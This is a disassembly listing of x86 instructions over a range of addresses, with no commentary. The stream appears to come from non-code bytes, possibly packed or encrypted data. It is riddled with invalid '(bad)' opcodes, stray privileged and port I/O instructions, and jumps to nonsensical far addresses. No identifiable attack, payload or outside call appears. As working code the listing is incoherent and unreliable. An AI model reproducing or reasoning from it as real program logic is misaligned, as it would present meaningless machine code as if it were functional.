  40f5c6:	mov    WORD PTR [ebx+ebx*1-0x7c],cs
  40f5ca:	ins    BYTE PTR es:[edi],dx
  40f5cb:	retf   
  40f5cc:	jo     0x40f57d
  40f5ce:	nop
  40f5cf:	cwde   
  40f5d0:	xchg   ecx,eax
  40f5d1:	cmp    eax,0x21937e9e
  40f5d6:	adc    al,0x2c
  40f5d8:	loopne 0x40f5e9
  40f5da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5db:	xor    al,0xa7
  40f5dd:	add    eax,0xc00aecd
  40f5e2:	xor    eax,0x4a030108
  40f5e7:	inc    ebp
  40f5e8:	call   0x5518:0x82bf6566
  40f5ef:	cld    
  40f5f0:	push   ss
  40f5f1:	inc    eax
  40f5f2:	fsubr  DWORD PTR [esi-0x266fff9f]
  40f5f8:	push   ss
  40f5f9:	push   es
  40f5fa:	adc    DWORD PTR [edi-0x217062a7],edx
  40f600:	mov    esi,0xf868fd03
  40f605:	lea    ebx,[ebp+0x27]
  40f608:	hlt    
  40f609:	rcl    BYTE PTR [ebp+0x2a],cl
  40f60c:	cmp    BYTE PTR [eax+0x31],0x3c
  40f610:	lods   eax,DWORD PTR ds:[esi]
  40f611:	cdq    
  40f612:	sub    eax,0x4b66a909
  40f617:	xchg   ecx,eax
  40f618:	stos   DWORD PTR es:[edi],eax
  40f619:	sti    
  40f61a:	or     ebx,edi
  40f61c:	ror    DWORD PTR [ebp-0x2f893d31],cl
  40f622:	lahf   
  40f623:	retf   0x780c
  40f626:	add    DWORD PTR [eax],edx
  40f628:	sub    DWORD PTR [esi+0x6f],ebx
  40f62b:	test   al,0x40
  40f62d:	stos   DWORD PTR es:[edi],eax
  40f62e:	nop
  40f62f:	or     al,0xbe
  40f631:	xor    al,BYTE PTR [edx]
  40f633:	xchg   BYTE PTR [ebx+0x34],bl
  40f636:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f637:	cli    
  40f638:	cmp    edx,DWORD PTR [edi+0x49]
  40f63b:	jns    0x40f5e8
  40f63d:	(bad)  
  40f63e:	jge    0x40f5f3
  40f640:	leave  
  40f641:	(bad)  
  40f642:	adc    esp,DWORD PTR [eax+0x6307f58d]
  40f648:	leave  
  40f649:	mov    al,0xcc
  40f64b:	sbb    DWORD PTR [ebx-0x51b78e25],eax
  40f651:	pusha  
  40f652:	cmp    dl,dh
  40f654:	sbb    dh,BYTE PTR ds:[ecx]
  40f657:	xchg   ecx,edi
  40f659:	push   ds
  40f65a:	fcomp  DWORD PTR [esi]
  40f65c:	sub    BYTE PTR [ebp+0x3],ch
  40f65f:	and    bl,bl
  40f661:	into   
  40f662:	in     al,dx
  40f663:	or     BYTE PTR [esi+0x3f],ch
  40f666:	outs   dx,DWORD PTR ds:[esi]
  40f667:	push   ecx
  40f668:	jmp    0x2c7e71e
  40f66d:	and    esp,ebx
  40f66f:	stos   BYTE PTR es:[edi],al
  40f670:	jmp    0x40f645
  40f672:	int    0x48
  40f674:	lea    ebp,[edi]
  40f676:	xor    edx,ecx
  40f678:	fst    DWORD PTR [edx+esi*8]
  40f67c:	arpl   WORD PTR [esi+ebx*8],sp
  40f67f:	addr16 sub eax,0x3cc0264
  40f685:	inc    BYTE PTR [esi+edi*2+0x4d]
  40f689:	mov    eax,ds:0x39a595e5
  40f68e:	and    eax,DWORD PTR [edi-0x41]
  40f691:	vpmulhuw ymm0,ymm2,ymm0
  40f695:	outs   dx,DWORD PTR ds:[esi]
  40f696:	jnp    0x40f695
  40f698:	mov    ds:0xb8c4118e,eax
  40f69d:	pop    esi
  40f69e:	scas   eax,DWORD PTR es:[edi]
  40f69f:	push   ecx
  40f6a0:	es mov ebp,0x5978c638
  40f6a6:	stos   DWORD PTR es:[edi],eax
  40f6a7:	mov    eax,ds:0x660c9f7b
  40f6ac:	mov    edi,0x7c81b8e6
  40f6b1:	shl    ebp,cl
  40f6b3:	mov    esi,?
  40f6b5:	gs ins BYTE PTR es:[edi],dx
  40f6b7:	out    0x6e,al
  40f6b9:	je     0x40f72b
  40f6bb:	inc    ebx
  40f6bc:	xchg   ecx,eax
  40f6bd:	inc    ebx
  40f6be:	into   
  40f6bf:	sahf   
  40f6c0:	mov    bh,0x9d
  40f6c2:	aam    0xa8
  40f6c4:	out    0xaf,eax
  40f6c6:	add    ebp,edx
  40f6c8:	pslld  mm4,QWORD PTR [ecx+0x62]
  40f6cc:	test   ebp,0x6478da50
  40f6d2:	into   
  40f6d3:	mov    gs,WORD PTR [ebx]
  40f6d5:	js     0x40f6b6
  40f6d7:	jg     0x40f682
  40f6d9:	pusha  
  40f6da:	stc    
  40f6db:	cli    
  40f6dc:	retf   0xdfd8
  40f6df:	dec    eax
  40f6e0:	add    eax,0x35fd8dee
  40f6e5:	inc    ebx
  40f6e6:	adc    bl,BYTE PTR [ecx+eax*4-0x24]
  40f6ea:	addr16 aas 
  40f6ec:	je     0x40f70b
  40f6ee:	pop    ebx
  40f6ef:	or     bl,dh
  40f6f1:	pop    eax
  40f6f2:	xchg   esi,eax
  40f6f3:	xor    esi,DWORD PTR [edi]
  40f6f5:	xchg   ebp,eax
  40f6f6:	jnp    0x40f760
  40f6f8:	cmp    eax,0x194d2645
  40f6fd:	mov    al,ds:0x6aa7836d
  40f702:	pop    ecx
  40f703:	jg     0x40f68a
  40f705:	jmp    0xb0df7d73
  40f70a:	xchg   edi,eax
  40f70b:	push   cs
  40f70c:	ret    0x9cf1
  40f70f:	mov    ah,0xc5
  40f711:	dec    esi
  40f712:	pop    ebx
  40f713:	in     eax,dx
  40f714:	cwde   
  40f715:	or     eax,0xf20f26dd
  40f71a:	inc    eax
  40f71b:	cmc    
  40f71c:	mov    BYTE PTR [ebx],dh
  40f71e:	and    BYTE PTR [ecx+0x793c8994],ah
  40f724:	lock mov dh,0x60
  40f727:	lods   al,BYTE PTR ds:[esi]
  40f728:	jne    0x40f788
  40f72a:	test   ebx,edi
  40f72c:	clc    
  40f72d:	cmc    
  40f72e:	out    dx,eax
  40f72f:	push   0x72
  40f731:	or     esp,ebp
  40f733:	in     al,0x6e
  40f735:	jae    0x40f71d
  40f737:	mov    ?,WORD PTR [edi]
  40f739:	xor    al,0xc6
  40f73b:	stos   DWORD PTR es:[edi],eax
  40f73c:	push   0xffffffc6
  40f73e:	test   eax,0x9d5f841c
  40f743:	in     eax,0xea
  40f745:	nop
  40f746:	or     DWORD PTR [edi],edx
  40f748:	btc    DWORD PTR [eax],eax
  40f74b:	xor    esi,DWORD PTR [edx]
  40f74d:	push   es
  40f74e:	mov    dl,0x4a
  40f750:	add    al,0xe4
  40f752:	jp     0x40f71c
  40f754:	(bad)  
  40f755:	ja     0x40f752
  40f757:	dec    eax
  40f758:	mov    ebx,0xa5b0e7fa
  40f75d:	aad    0x78
  40f75f:	adc    eax,0x90566bd4
  40f764:	sti    
  40f765:	fisubr WORD PTR [esi+0x4b]
  40f768:	inc    eax
  40f769:	xchg   esi,eax
  40f76a:	mov    eax,ds:0x20d7b83d
  40f76f:	lock jne 0x40f739
  40f772:	inc    dx
  40f774:	icebp  
  40f775:	jmp    0x2140:0x1f1f6c30
  40f77c:	adc    al,0xf7
  40f77e:	add    ch,0xfd
  40f781:	fstp   QWORD PTR [eax]
  40f783:	popa   
  40f784:	sub    BYTE PTR [edi+0x8514f09],dl
  40f78a:	fstp   DWORD PTR [ebx-0x105f9f52]
  40f790:	outs   dx,DWORD PTR ds:[esi]
  40f791:	cmp    ebx,edx
  40f793:	pop    edx
  40f794:	js     0x40f735
  40f796:	dec    esp
  40f797:	mov    eax,ds:0x8f60466d
  40f79c:	xchg   ebp,eax
  40f79d:	pop    esp
  40f79e:	xchg   edx,eax
  40f79f:	test   eax,0x1470e6da
  40f7a4:	dec    eax
  40f7a5:	js     0x40f7d3
  40f7a7:	inc    edx
  40f7a8:	mov    cs,WORD PTR ds:0x22348935
  40f7ae:	or     eax,0x9cc8bb1f
  40f7b3:	and    BYTE PTR [esi],dh
  40f7b5:	ja     0x40f75c
  40f7b7:	sbb    DWORD PTR [esi+0x20f65064],ebx
  40f7bd:	adc    eax,0xdac6926c
  40f7c2:	xor    BYTE PTR [edi],dh
  40f7c4:	daa    
  40f7c5:	push   cs
  40f7c6:	mov    WORD PTR [eax-0x2d],ss
  40f7c9:	xchg   edx,eax
  40f7ca:	push   0x8a927479
  40f7cf:	pusha  
  40f7d0:	pop    ss
  40f7d1:	mov    ah,0xf0
  40f7d3:	popa   
  40f7d4:	cs test eax,0x96d62ca2
  40f7da:	cmp    al,0x66
  40f7dc:	jecxz  0x40f84f
  40f7de:	rol    BYTE PTR [esi],0xf5
  40f7e1:	shl    DWORD PTR [ebp-0x60aad2f0],1
  40f7e7:	sub    bh,BYTE PTR [ebx]
  40f7e9:	xchg   esi,eax
  40f7ea:	cli    
  40f7eb:	(bad)  
  40f7ec:	je     0x40f865
  40f7ee:	or     al,0x5e
  40f7f0:	mov    cl,0xaa
  40f7f2:	leave  
  40f7f3:	and    ch,BYTE PTR [edi+0x7ae3fc93]
  40f7f9:	jae    0x40f78d
  40f7fb:	popa   
  40f7fc:	dec    eax
  40f7fd:	data16 test al,0xed
  40f800:	sar    esi,1
  40f802:	sub    eax,0x49d6737c
  40f807:	cs jle 0x40f7ad
  40f80a:	dec    eax
  40f80b:	xchg   BYTE PTR [edx+0x4a],cl
  40f80e:	xor    eax,0x40756447
  40f813:	dec    ebx
  40f814:	pop    edi
  40f815:	hlt    
  40f816:	mov    bl,0xc7
  40f818:	mov    gs,ecx
  40f81a:	xchg   ebp,eax
  40f81b:	lock or ax,0x7a7c
  40f820:	sbb    DWORD PTR [ebx],ecx
  40f822:	pop    esi
  40f823:	shr    ah,1
  40f825:	mov    fs,WORD PTR [esi]
  40f827:	in     eax,dx
  40f828:	add    ch,BYTE PTR [edi]
  40f82a:	adc    ebp,0xfcbf9d37
  40f830:	mov    dl,0x86
  40f832:	dec    ecx
  40f833:	stos   DWORD PTR es:[edi],eax
  40f834:	adc    eax,0xb84fa05a
  40f839:	scas   eax,DWORD PTR es:[edi]
  40f83a:	rcr    BYTE PTR [edi],1
  40f83c:	outs   dx,BYTE PTR ds:[esi]
  40f83d:	pop    eax
  40f83e:	sbb    al,BYTE PTR [ebp-0xa90bebf]
  40f844:	daa    
  40f845:	out    dx,al
  40f846:	add    eax,0x595c92a4
  40f84b:	sbb    eax,0x16a7a5d4
  40f850:	xor    al,0x9b
  40f852:	add    DWORD PTR [ebp+0x53],0x1e8a32a7
  40f859:	mov    ecx,0x73e6bc7a
  40f85e:	jecxz  0x40f886
  40f860:	into   
  40f861:	inc    ebp
  40f862:	aas    
  40f863:	jle    0x40f83f
  40f865:	xchg   ebx,eax
  40f866:	outs   dx,DWORD PTR ds:[esi]
  40f867:	outs   dx,DWORD PTR ds:[esi]
  40f868:	xchg   ebx,eax
  40f869:	xor    edx,eax
  40f86b:	xlat   BYTE PTR ds:[ebx]
  40f86c:	adc    eax,0x788624b3
  40f871:	and    eax,0x7d200819
  40f876:	and    al,0xee
  40f878:	(bad)  
  40f879:	scas   al,BYTE PTR es:[edi]
  40f87a:	jo     0x40f806
  40f87c:	sub    edi,esp
  40f87e:	xor    BYTE PTR ds:0x87827d0f,dl
  40f884:	fbstp  TBYTE PTR [eax-0x7324af06]
  40f88a:	xchg   esp,eax
  40f88b:	xor    ebp,DWORD PTR [ecx+0x7b25347f]
  40f891:	lahf   
  40f892:	add    al,0x34
  40f894:	push   ecx
  40f895:	nop
  40f896:	xchg   eax,ebp
  40f898:	jmp    FWORD PTR [edi+edi*8-0x7fde00a1]
  40f89f:	out    dx,eax
  40f8a0:	dec    ebx
  40f8a1:	sub    bl,bl
  40f8a3:	or     al,BYTE PTR [esi-0x34]
  40f8a6:	shl    BYTE PTR [edx],0x1b
  40f8a9:	sub    DWORD PTR [ecx],edx
  40f8ab:	jnp    0x40f855
  40f8ad:	jge    0x40f8e6
  40f8af:	dec    eax
  40f8b0:	dec    ebx
  40f8b1:	or     al,0xfe
  40f8b3:	mov    ds:0x84238ba5,eax
  40f8b8:	mov    esp,0x276fbfac
  40f8bd:	out    dx,al
  40f8be:	aaa    
  40f8bf:	sub    cl,BYTE PTR [edx+0x4396f0ca]
  40f8c5:	in     al,dx
  40f8c6:	cmp    edx,DWORD PTR [eax+0x5605a874]
  40f8cc:	pop    ecx
  40f8cd:	and    dl,BYTE PTR [ecx]
  40f8cf:	xchg   dh,cl
  40f8d1:	bound  esi,QWORD PTR [edi-0x57]
  40f8d4:	pop    edx
  40f8d5:	rol    DWORD PTR [edi],1
  40f8d7:	push   eax
  40f8d8:	mov    ebp,0xaae44e12
  40f8dd:	int    0x19
  40f8df:	add    bh,BYTE PTR gs:[edx+edi*8+0x6fc138d4]
  40f8e7:	(bad)  
  40f8e8:	popf   
  40f8e9:	dec    edx
  40f8ea:	sahf   
  40f8eb:	sti    
  40f8ec:	pop    eax
  40f8ed:	jne    0x40f896
  40f8ef:	hlt    
  40f8f0:	or     edx,DWORD PTR [ebx]
  40f8f2:	jmp    0x10bed67b
  40f8f7:	not    bl
  40f8f9:	fwait
  40f8fa:	cwde   
  40f8fb:	out    0xf7,eax
  40f8fd:	or     al,0x48
  40f8ff:	jl     0x40f8fe
  40f901:	xchg   ecx,eax
  40f902:	or     dl,al
  40f904:	js     0x40f970
  40f906:	test   al,0x17
  40f908:	adc    eax,DWORD PTR [edx]
  40f90a:	push   edx
  40f90b:	or     dh,al
  40f90d:	pop    ss
  40f90e:	mov    edx,DWORD PTR [edi+edx*8-0x70]
  40f912:	int3   
  40f913:	and    al,0x6e
  40f915:	std    
  40f916:	inc    ebp
  40f917:	loopne 0x40f94b
  40f919:	daa    
  40f91a:	push   eax
  40f91b:	or     ah,BYTE PTR [eax]
  40f91d:	pop    esp
  40f91e:	dec    ecx
  40f91f:	xchg   esi,eax
  40f920:	xchg   esi,eax
  40f921:	or     DWORD PTR [ebp-0x32],0xffffffc1
  40f925:	mov    bl,0x28
  40f927:	mov    eax,ds:0xe53fdb0b
  40f92c:	pop    ecx
  40f92d:	add    DWORD PTR [ecx+0xa],0xfffffffa
  40f931:	push   cs
  40f932:	inc    ebx
  40f933:	das    
  40f934:	retf   
  40f935:	loope  0x40f98d
  40f937:	xchg   edi,eax
  40f938:	mov    edi,0x784cc4c3
  40f93d:	adc    BYTE PTR [eax-0x74],al
  40f940:	test   eax,0x94c679e5
  40f945:	pusha  
  40f946:	jecxz  0x40f939
  40f948:	xor    eax,0x62acd6b4
  40f94d:	pop    ebp
  40f94e:	mov    cl,0xef
  40f950:	or     BYTE PTR [ebp+edi*8+0x5b],dh
  40f954:	adc    BYTE PTR [eax+eax*8+0x1053dc5e],al
  40f95b:	xchg   esi,eax
  40f95c:	lods   al,BYTE PTR ds:[esi]
  40f95d:	adc    al,0xf
  40f95f:	mov    esi,DWORD PTR [edi]
  40f961:	push   0x23
  40f963:	arpl   sp,bx
  40f965:	or     BYTE PTR [ebp+0x73],cl
  40f968:	adc    eax,0x6e69f84f
  40f96d:	test   edx,esp
  40f96f:	jmp    0x40f95d
  40f971:	pop    esp
  40f972:	xlat   BYTE PTR ds:[ebx]
  40f973:	popa   
  40f974:	sbb    al,0xee
  40f976:	adc    DWORD PTR [ebx+0x68],esi
  40f979:	mov    cl,0x2d
  40f97b:	pop    edx
  40f97c:	cmp    ebp,DWORD PTR [ebp+0x3b073532]
  40f982:	dec    cl
  40f984:	mov    dh,BYTE PTR [ebx]
  40f986:	in     al,dx
  40f987:	inc    DWORD PTR [ecx-0x60]
  40f98a:	inc    ebp
  40f98b:	inc    esi
  40f98c:	push   eax
  40f98d:	or     bh,BYTE PTR [ecx+0x4d0e5b60]
  40f993:	rcr    DWORD PTR ds:0xd8401412,1
  40f999:	retf   0x2615
  40f99c:	dec    ecx
  40f99d:	sbb    eax,DWORD PTR [ebp+0x4c713f01]
  40f9a3:	add    bh,BYTE PTR [eax-0x5]
  40f9a6:	adc    ebx,ecx
  40f9a8:	iret   
  40f9a9:	add    eax,0xaea683ef
  40f9ae:	das    
  40f9af:	mov    ebp,0x1f9a9113
  40f9b4:	jo     0x40f974
  40f9b6:	mov    edx,esp
  40f9b8:	mov    edx,0xf37dc7e0
  40f9bd:	ds mov esi,0xa5c766f3
  40f9c3:	imul   DWORD PTR [ebp+0x6e]
  40f9c6:	add    ebp,DWORD PTR [ecx]
  40f9c8:	ds adc esp,esp
  40f9cb:	add    BYTE PTR [edi-0x7f91d64],0x2
  40f9d2:	fidivr DWORD PTR [eax]
  40f9d4:	jge    0x40f9cf
  40f9d6:	sub    al,0x15
  40f9d8:	adc    ch,BYTE PTR ds:0x237ee699
  40f9de:	mov    eax,ds:0xaf8bc971
  40f9e3:	in     eax,dx
  40f9e4:	js     0x40f9ba
  40f9e6:	sub    BYTE PTR ds:0x917c9216,ch
  40f9ec:	je     0x40fa13
  40f9ee:	xchg   BYTE PTR [ebp+0x6a],al
  40f9f1:	retf   
  40f9f2:	xchg   edx,eax
  40f9f3:	imul   edi,edx,0x6e
  40f9f6:	pop    ebp
  40f9f7:	push   eax
  40f9f8:	xor    DWORD PTR [edx+0x20],edx
  40f9fb:	or     al,0x62
  40f9fd:	mov    esi,0x784adfb4
  40fa02:	xlat   BYTE PTR ds:[ebx]
  40fa03:	dec    ebp
  40fa04:	mov    edi,0x9b5a7d37
  40fa09:	mov    esi,0xe10f05a3
  40fa0e:	jp     0x40fa2c
  40fa10:	push   0x506c1809
  40fa15:	and    BYTE PTR [edi+0x31bb5d21],al
  40fa1b:	xchg   ebx,eax
  40fa1c:	retf   0x72e3
  40fa1f:	fisubr WORD PTR [ecx+0x13]
  40fa22:	fwait
  40fa23:	aad    0xcb
  40fa25:	ror    ah,0x29
  40fa28:	loop   0x40fa3b
  40fa2a:	xor    ecx,DWORD PTR [ebx-0x6431e39b]
  40fa30:	inc    esi
  40fa31:	test   al,0xf6
  40fa33:	aas    
  40fa34:	push   DWORD PTR gs:[ebp+0x3f]
  40fa38:	out    0x26,eax
  40fa3a:	and    DWORD PTR [edi+ecx*2-0x2c],esi
  40fa3e:	jl     0x40fa6b
  40fa40:	mov    cs:0x817595fe,eax
  40fa46:	pop    eax
  40fa47:	ficom  WORD PTR [eax+eiz*4]
  40fa4a:	adc    bh,BYTE PTR [edi+eax*2]
  40fa4d:	pop    esi
  40fa4e:	out    dx,eax
  40fa4f:	dec    esi
  40fa50:	iret   
  40fa51:	xlat   BYTE PTR ds:[ebx]
  40fa52:	stos   DWORD PTR es:[edi],eax
  40fa53:	inc    esp
  40fa54:	push   es
  40fa55:	cwde   
  40fa56:	cmp    DWORD PTR [ecx-0x43d9f0cf],edi
  40fa5c:	pop    edi
  40fa5d:	push   es
  40fa5e:	mov    ds:0xb5cf643f,eax
  40fa63:	xor    eax,0x9d67
  40fa68:	icebp  
  40fa69:	push   0xc255967c
  40fa6e:	pop    ebx
  40fa6f:	jno    0x40fa78
  40fa71:	mov    ds:0xa2b3077a,al
  40fa76:	or     BYTE PTR [ebp-0x67],ch
  40fa79:	out    0x11,eax
  40fa7b:	aam    0x3
  40fa7d:	mov    ebp,0xd36e20b5
  40fa82:	sbb    ch,bh
  40fa84:	mov    ds,WORD PTR [eax+edx*4+0x3c]
  40fa88:	repz iret 
  40fa8a:	ins    BYTE PTR es:[edi],dx
  40fa8b:	mov    esp,0x272c8e45
  40fa90:	fs ret 
  40fa92:	nop
  40fa93:	xchg   ebp,eax
  40fa94:	aad    0x8b
  40fa96:	bound  edx,QWORD PTR [ecx+eiz*8]
  40fa99:	mov    WORD PTR [ebx-0x37],gs
  40fa9c:	sub    bh,BYTE PTR [esi]
  40fa9e:	out    dx,eax
  40fa9f:	mov    al,0x6e
  40faa1:	(bad)  ds:0x3c67eb1b
  40faa7:	sub    ecx,eax
  40faa9:	mov    al,0x7
  40faab:	aam    0xe0
  40faad:	lods   al,BYTE PTR ds:[esi]
  40faae:	xor    BYTE PTR fs:[edx+0x1ea5e500],bh
  40fab5:	nop
  40fab6:	pop    edx
  40fab7:	and    bh,BYTE PTR [edi-0x2a]
  40faba:	jle    0x40fa68
  40fabc:	jmp    0x3566421a
  40fac1:	popa   
  40fac2:	push   es
  40fac3:	mov    bh,0x9d
  40fac5:	(bad)  
  40fac6:	cli    
  40fac7:	sti    
  40fac8:	dec    edx
  40fac9:	imul   edx,DWORD PTR [edi+ebp*1],0xb2e693af
  40fad0:	aam    0xa5
  40fad2:	jae    0x40fb47
  40fad4:	mov    BYTE PTR [edi],bl
  40fad6:	pshufw mm6,QWORD PTR [eax],0xe8
  40fada:	and    ch,bl
  40fadc:	xor    esi,DWORD PTR [edi+esi*4+0x6b]
  40fae0:	mov    ebp,0x17ae8abd
  40fae5:	jae    0x40fb1d
  40fae7:	test   eax,0xff925c37
  40faec:	sub    ecx,DWORD PTR [edi+0x2c]
  40faef:	adc    al,cl
  40faf1:	pop    ebx
  40faf2:	pop    ds
  40faf3:	(bad)  
  40faf4:	fnstsw WORD PTR [edi+esi*8]
  40faf7:	repz cmp dl,BYTE PTR [ebx-0xac0928e]
  40fafe:	cmp    edx,DWORD PTR [edi-0x435cf8c2]
  40fb04:	jbe    0x40faa2
  40fb06:	cs push edx
  40fb08:	into   
  40fb09:	sub    bh,BYTE PTR ds:0x8c394778
  40fb0f:	and    eax,0xbca7c2de
  40fb14:	push   ds
  40fb15:	and    BYTE PTR [esi-0x26cff01b],bh
  40fb1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb1c:	mov    edx,0x125933c6
  40fb21:	mov    BYTE PTR [ebp+0x48],al
  40fb24:	pop    edx
  40fb25:	pop    es
  40fb26:	dec    esi
  40fb27:	sbb    edi,DWORD PTR [esp+ebp*4]
  40fb2a:	aam    0x88
  40fb2c:	add    DWORD PTR [ebx+0x3e863c3c],0x8ec1f267
  40fb36:	sub    esp,edx
  40fb38:	xor    eax,0xe7a3020b
  40fb3d:	or     al,0x84
  40fb3f:	jb     0x40fb9d
  40fb41:	arpl   WORD PTR [edx-0x34],bp
  40fb44:	mov    cl,0x42
  40fb46:	out    0x89,al
  40fb48:	mov    esi,?
  40fb4a:	call   0x77b9:0xb99a9ac9
  40fb51:	jmp    0x2042:0x9f95c3bd
  40fb58:	loope  0x40fb92
  40fb5a:	cmp    eax,0x7902f203
  40fb5f:	add    DWORD PTR [ebp-0x2689b58a],ecx
  40fb65:	xchg   ecx,eax
  40fb66:	jg     0x40fbd2
  40fb68:	cs inc eax
  40fb6a:	cmp    bl,bh
  40fb6c:	mov    al,ds:0x932f3a1c
  40fb71:	int3   
  40fb72:	or     al,0xc9
  40fb74:	xor    DWORD PTR [esi],esi
  40fb76:	scas   eax,DWORD PTR es:[edi]
  40fb77:	ins    BYTE PTR es:[edi],dx
  40fb78:	jno    0x40fb34
  40fb7a:	jmp    0x40fb19
  40fb7c:	and    al,0xb6
  40fb7e:	fsubr  DWORD PTR [ecx-0x7d542849]
  40fb84:	out    dx,al
  40fb85:	ins    DWORD PTR es:[edi],dx
  40fb86:	mov    ebx,edx
  40fb88:	sbb    al,0x94
  40fb8a:	stos   BYTE PTR es:[edi],al
  40fb8b:	mov    ?,WORD PTR [edx]
  40fb8d:	dec    ebx
  40fb8e:	or     ebp,DWORD PTR [edx]
  40fb90:	and    dl,BYTE PTR [edx]
  40fb92:	or     DWORD PTR [ebp+0x28927b8],0x80845991
  40fb9c:	fistp  WORD PTR [eax-0x47ea47b1]
  40fba2:	das    
  40fba3:	xchg   BYTE PTR [edx+esi*8+0x7f],dh
  40fba7:	sbb    esi,edx
  40fba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbaa:	adc    cl,BYTE PTR [edx+0x1eeaedaa]
  40fbb0:	mov    dl,0x3d
  40fbb2:	ins    DWORD PTR es:[edi],dx
  40fbb3:	jge    0x40fbac
  40fbb5:	push   esp
  40fbb6:	rcr    DWORD PTR [edx-0x57],cl
  40fbb9:	inc    ebx
  40fbba:	mov    ds:0x3b653521,al
  40fbbf:	adc    eax,0x5c5c2d87
  40fbc4:	imul   esi,DWORD PTR [esi+0x7e02f4a4],0x9af723b2
  40fbce:	add    BYTE PTR [ebp+edi*2-0xf8749cc],ah
  40fbd5:	and    edi,DWORD PTR [ecx+0x226b5379]
  40fbdb:	push   edx
  40fbdc:	shr    BYTE PTR [edx-0x3ac110c9],cl
  40fbe2:	pop    edi
  40fbe3:	dec    ebp
  40fbe4:	mov    edx,0x992883a2
  40fbe9:	pop    ss
  40fbea:	add    eax,0xa4456d84
  40fbef:	inc    ebp
  40fbf0:	jns    0x40fbb3
  40fbf2:	xor    eax,0x98d45436
  40fbf7:	sbb    ch,BYTE PTR [edi+0x72]
  40fbfa:	mov    al,ds:0xcf4659ff
  40fbff:	xor    eax,0x50f61e24
  40fc04:	add    DWORD PTR ds:0x43b63358,ebp
  40fc0a:	xchg   BYTE PTR [edx-0x23],bh
  40fc0d:	lahf   
  40fc0e:	(bad)  [ecx+0x5200a8bf]
  40fc14:	int3   
  40fc15:	stc    
  40fc16:	fsubr  QWORD PTR [ebp-0x2bad5810]
  40fc1c:	fcom   QWORD PTR [ecx+0x18]
  40fc1f:	das    
  40fc20:	test   DWORD PTR [ebx],ebp
  40fc22:	mov    al,ds:0xa17214f7
  40fc27:	test   BYTE PTR [edi+eiz*1],bl
  40fc2a:	jbe    0x40fbb2
  40fc2c:	pop    ebp
  40fc2d:	scas   al,BYTE PTR es:[edi]
  40fc2e:	mov    dl,0xf7
  40fc30:	add    edi,ebp
  40fc32:	xor    BYTE PTR ds:0xb8e5482b,bh
  40fc39:	retf   0x3e62
  40fc3c:	scas   al,BYTE PTR es:[edi]
  40fc3d:	pushf  
  40fc3e:	add    ebx,DWORD PTR [esi-0x78365a9]
  40fc44:	xchg   esp,eax
  40fc45:	ret    0xb271
  40fc48:	sbb    al,0x22
  40fc4a:	jmp    0x2160a231
  40fc4f:	push   cs
  40fc50:	repz (bad) 
  40fc52:	and    DWORD PTR [esi],0xa6411193
  40fc58:	mov    DWORD PTR [edi-0x13],ecx
  40fc5b:	mov    ds:0xebda4b5c,al
  40fc60:	adc    bl,BYTE PTR [edi+0x6d]
  40fc63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc64:	cmp    eax,esp
  40fc66:	imul   BYTE PTR [edx-0x30]
  40fc69:	andps  xmm3,xmm5
  40fc6c:	cmp    al,0x85
  40fc6e:	mov    es,WORD PTR [esi]
  40fc70:	mov    esp,0xdbdabf95
  40fc75:	pop    ss
  40fc76:	rcl    DWORD PTR [edx-0x57],cl
  40fc79:	lds    eax,FWORD PTR [ebx-0xe2a24dd]
  40fc7f:	xor    eax,0xfcf500d5
  40fc84:	mov    al,ds:0x20d9f63
  40fc89:	mov    ebx,0xa9237d12
  40fc8e:	ds ret 
  40fc90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc91:	ins    DWORD PTR es:[edi],dx
  40fc92:	arpl   ax,ax
  40fc94:	push   0x0
	...
  40fd12:	add    BYTE PTR [eax],al
  40fd14:	fdiv   QWORD PTR [ecx]
  40fd16:	mov    eax,0xfedbfd5a
  40fd1b:	mov    bh,0xdd
  40fd1d:	xchg   edx,eax
  40fd1e:	iret   
  40fd1f:	mov    DWORD PTR [edi-0x4f],ebx
  40fd22:	jp     0x40fd7d
  40fd24:	shr    BYTE PTR [eax+0x7690000],cl
  40fd2a:	add    BYTE PTR [eax],al
  40fd2c:	sti    
  40fd2d:	das    
  40fd2e:	repz jmp 0xdb40a459
  40fd34:	xchg   edi,eax
  40fd35:	sub    al,0x7b
  40fd37:	mov    ecx,0x441bf6f6
  40fd3c:	inc    esi
  40fd3d:	cmp    BYTE PTR [eax+0x57],bh
  40fd40:	and    ecx,DWORD PTR [ebx+0x54829b6a]
  40fd46:	lock xor ebp,esp
  40fd49:	xchg   ebp,eax
  40fd4a:	inc    ebx
  40fd4b:	fdivr  DWORD PTR [edi]
  40fd4d:	dec    edx
  40fd4e:	jno    0x40fdc9
  40fd50:	jb     0x40fce4
  40fd52:	dec    ecx
  40fd53:	daa    
  40fd54:	pop    ebp
  40fd55:	add    ah,BYTE PTR [ebx-0x5f446806]
  40fd5b:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40fd5d:	cmp    edi,DWORD PTR [edi-0x23]
  40fd60:	push   ebp
  40fd61:	rcl    BYTE PTR [ecx+0x507690],1
  40fd67:	cmp    ebx,DWORD PTR [ebp-0x2c]
  40fd6a:	hlt    
  40fd6b:	mov    edx,0xa900bfcb
  40fd70:	in     eax,dx
  40fd71:	push   0xffffff9c
  40fd73:	lock test al,0xa0
  40fd76:	repnz hlt 
  40fd78:	jg     0x40fdb8
  40fd7a:	rcl    BYTE PTR [ecx+ebp*8+0x665ffcad],1
  40fd81:	into   
  40fd82:	aam    0xdf
  40fd84:	ja     0x40fd62
  40fd86:	add    edx,edx
  40fd88:	popa   
  40fd89:	xchg   ebp,eax
  40fd8a:	popf   
  40fd8b:	mov    eax,ds:0x3fed49dd
  40fd90:	xor    esi,DWORD PTR [edi]
  40fd92:	pop    edx
  40fd93:	inc    edi
  40fd94:	gs add ch,dl
  40fd97:	in     eax,0x87
  40fd99:	mov    dl,0x20
  40fd9b:	add    al,0xca
  40fd9d:	mov    esi,0x502b4441
  40fda2:	cs and eax,0xb1bd3a63
  40fda8:	jbe    0x40fe03
  40fdaa:	xchg   esp,eax
  40fdab:	or     cl,BYTE PTR [eax-0x42]
  40fdae:	xchg   BYTE PTR [esi],dh
  40fdb0:	adc    eax,edi
  40fdb2:	xchg   edi,eax
  40fdb3:	jns    0x40fe33
  40fdb5:	sbb    edi,ebp
